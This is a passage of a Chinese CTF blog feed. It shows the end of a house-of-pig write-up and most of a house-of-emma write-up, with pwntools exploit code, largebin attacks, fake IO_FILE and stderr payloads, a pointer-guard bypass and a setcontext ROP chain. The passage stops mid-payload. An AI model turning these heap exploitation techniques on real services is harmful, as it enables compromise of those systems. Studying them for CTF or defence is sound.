p64(heap_base+<span class="number">0x13da0</span>)*<span class="number">2</span>+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache smashing unlink</span></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>)) <span class="comment">#2-9 calloced</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>) + p64(heap_base+<span class="number">0x12ce0</span>) + p64(free_hook-<span class="number">0x10</span>)+cyclic(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))   <span class="comment">#3-&gt;4</span></span><br><span class="line"><span class="comment">#gift!</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;01dwang&#x27;s Gift:\n&quot;</span>)</span><br><span class="line"><span class="comment">#fake IOFILE</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size)</span><br><span class="line"></span><br><span class="line">old_buf = fp-&gt;_IO_buf_base</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</span><br></pre></td></tr></table></figure><p>此时<code>_IO_list_all</code>指针已经指向了gift chunk,这个chunk的内容完全是可控的</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p><p>注意前面tcache stashing unlink改的位置，可能需要在__free_hook的地址处加减0x8，因为tcache申请会检查十六字节对齐</p><p>因为我没用原题的glibc,这里我对齐之后，0xe8大小的堆块不够写了，按照出题人的思路应该是刚好够写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = heap_base+<span class="number">0x13da0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2166c0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</span><br></pre></td></tr></table></figure><h3 id="改memset-got做法"><a href="#改memset-got做法" class="headerlink" title="改memset got做法"></a>改memset got做法</h3><p>由于libc是partial RELRO，got表可写</p><p>因此可以把memset的got当作一个__free_hook</p><p>注意这里做tcache stashing unlink时不能直接覆盖memset的got表，这是因为calloc中会调用memset,如果这时的got已经进入tcache,则会变成加密后的fd，rip运行到这里时会报错</p><p>因而正确的做法应该是预留一定的空间，本题限制较大，故不做演示，仅提出思路</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of emma 21湖湘杯复现</title>
      <link href="/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>讲水课，恰大米</p></blockquote><p>沙箱开启，考虑orw</p><p>保护全开</p><h2 id="VM分析"><a href="#VM分析" class="headerlink" title="VM分析"></a>VM分析</h2><p>循环输入，每次读最多0x500，每次循环分配释放0x2000空间</p><p>注意这里每次循环时的malloc,会影响后面的堆风水</p><h3 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h3><p><code>sub_1288</code>处无法识别</p><p>undefine后，由gdb动调知入口在0x1289处，修复为函数</p><p>将输入的字符串指针存在<code>[rbp-18h]</code>处</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720151519060.png" alt="image-20230720151519060"></p><p>随后取第一个byte，与运算0Fh，进行一个没什么用的检查，再将该值*4放入<code>rdx</code>，与一个首地址相加放入<code>eax</code>，符号拓展为<code>rax</code>（因为是负数），再与该首地址相加（<code>rax</code>为补码，实际为相减），其中算负数计算式为<code>hex((~0xfffffffffffff3a1&amp;0xffffffffffffffff)+0x1)</code>，随后跳转到该位置</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720152303704.png" alt="image-20230720152303704"></p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>1488h</td><td>13ddh</td><td>1404h</td><td>1428h</td><td>144ch</td><td>1481h</td><td>12dah</td><td>130dh</td><td>13abh</td><td>1342h</td></tr><tr><td>fail</td><td>add</td><td>delet</td><td>show</td><td>edit</td><td>leave&amp;ret</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230721133000180.png" alt="image-20230721133000180"></p><p>连按d修复跳转表，观察补码可知为4字节一组</p><p>其实可以用ida的edit-&gt;other-&gt;specify switch idiom功能修复为switch</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174743516-1689673665848-1.png" alt="image-20230718174743516"></li><li>+4&amp;jump to start</li></ul><h3 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h3><ul><li><p>index 2nd byte</p></li><li><p>uaf</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174950029.png" alt="image-20230718174950029"></p></li><li><p>+2</p></li></ul><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul><li><p>index 2nd byte</p></li><li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718175134076.png" alt="image-20230718175134076"></p></li><li><p>+2</p></li></ul><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><ul><li>index 2nd byte</li><li>size 2nd word</li><li>content 2nd dword, size</li><li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230719093944933.png" alt="image-20230719093944933"></li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>存在UAF，可多次进行largbin attack</p><p>无法改写为任意地址，无法直接house of kiwi，考虑house of emma</p><ul><li><p>泄露libc、heap基址</p></li><li><p>两次largbin attack改写<code>stderr</code>和<code>__pointer_chk_guard</code></p></li><li><p>合理伪造stderr与IO链</p></li><li><p>触发<code>__malloc_assert</code></p></li></ul><h2 id="堆布局与largbin-attack"><a href="#堆布局与largbin-attack" class="headerlink" title="堆布局与largbin attack"></a>堆布局与largbin attack</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#获取libc基址</span></span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + <span class="number">0x3c0740</span> + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure><p>free掉任意一个unsorted bin可获取libc基址</p><blockquote><p>问题：这里的chunk 0为什么能保持在unsorted bin中，而没有在循环开始malloc0x2000时放入large bin？</p><p>因为chunk 0和0x2000紧邻，每次完成循环都会触发合并，并在分配时被切下来</p></blockquote><p>构造0&lt;2，free掉后申请一块较小的chunk，将2放入largebin以获取heap基址</p><p>注意输出存在截断，可以先把2的fd,bk部分填满，事后记得要修复</p><p>注意largbin大小0x440~0x480为一个范围，为后续largebin attack起见，应注意预留大小</p><h3 id="largebin-attack-2"><a href="#largebin-attack-2" class="headerlink" title="largebin attack*2"></a>largebin attack*2</h3><p>largebin attack的利用方式：</p><ol><li>将一个较大的、largebin中的chunk的bk_nextsize覆盖为[target-0x20]</li><li>将一个较小的chunk放入<strong>同一个</strong>largebin，触发unlink</li><li>此时[target]的内容被修改为较小chunk的地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)<span class="comment">#构造的同时顺便修复</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>将5free掉，放入largebin，打出一次attack，修改stderr</p><p>又通过7将5申请回来，（这里申请之前没有修复，导致stderr指向了2）</p><p>随后再更改2，再free掉7（5），打出第二次attack，修改point_guard</p><h3 id="pointer-chk-guard"><a href="#pointer-chk-guard" class="headerlink" title="__pointer_chk_guard"></a>__pointer_chk_guard</h3><p>该值存在于fs:0x30</p><p>tls基址查看方式为<code>fsbase</code>或<code>tls</code>（pwngdb)，加上0x30即为guard值</p><p>也可以直接用gdb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call arch_prctl(0x1003, $rsp - 0x8)    </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0</span> </span><br><span class="line">(gdb) x /gx $rsp - 0x8</span><br><span class="line">0x7fffffffe6e8: 0x00007ffff7fe0700   =&gt; IA32_FS_BASE</span><br></pre></td></tr></table></figure><p>本地gdb调试时该值与libc偏移可能改变，调试时可以先关闭aslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><h3 id="修复largebin与准备触发-malloc-assert"><a href="#修复largebin与准备触发-malloc-assert" class="headerlink" title="修复largebin与准备触发__malloc_assert"></a>修复largebin与准备触发__malloc_assert</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>先分别修补两个largebin，防止分配时发生错误</p><p>申请8填补5,申请9填补2</p><p>将最外层的chunk 6 free掉，加入unsorted bin并与top chunk合并</p><p>再申请一块略小于6的chunk 10，通过修改chunk 6的内容修改top chunk的size段</p><p>此处改为0x10使之页不对齐</p><p>后面只需要申请一个chunk就可以触发<code>__malloc_assert</code></p><h2 id="构造IO利用链"><a href="#构造IO利用链" class="headerlink" title="构造IO利用链"></a>构造IO利用链</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>假设我们控制了<code>stderr</code>，进入了<code>_IO_cookie_write</code>，调用函数指针<code>write_cb</code>，此时我们只能控制进入函数时的<code>rdi</code>，而控制<code>setcontext</code>需要控制rdx</p><p>碰巧有一个gadget，能够利用<code>rdi</code>控制<code>rdx</code>，还能call一个和<code>rdx</code>相关的地址</p><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720211806875.png" alt="image-20230720211806875"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br></pre></td></tr></table></figure><h3 id="fake-stderr"><a href="#fake-stderr" class="headerlink" title="fake stderr"></a>fake stderr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>进入<code>__malloc_assert</code>后，利用<code>__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn ( =&gt; _IO_cookie_write)</code>调用链</p><p>需要满足<code>_IO_write_ptr &gt; _IO_write_base</code>，且<code>_lock</code>指向可写地址，此处直接使用原地址<code>_IO_stdfile_2_lock</code></p><p><code>vtable</code>需要伪造，触发IO时，原本指向<code>_IO_file_jumps -&gt; __xsputn</code>，即<code>&lt;__GI__IO_file_jumps+56&gt;</code>，需要伪造为<code>_IO_cookie_jumps-&gt; __write</code>，即<code>&lt;_IO_cookie_jumps+120&gt;</code>，故此处填上<code>_IO_cookie_jumps+0x40</code></p><p>构造<code>__cookie</code>为chunk 0的地址，注意为了方便更改，地址加上0x10，之后chunk 0的用户地址会进入<code>rdi</code></p><p>构造<code>cookie_write_function_t *write</code>处指针为gadget地址，调用时直接运行gadget，此处有加密</p><h3 id="rdi-rdx"><a href="#rdi-rdx" class="headerlink" title="rdi -&gt; rdx"></a>rdi -&gt; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>修改chunk 0，使rdx指向chunk5</p><h3 id="布置rdx附近满足setcontext"><a href="#布置rdx附近满足setcontext" class="headerlink" title="布置rdx附近满足setcontext"></a>布置rdx附近满足setcontext</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span 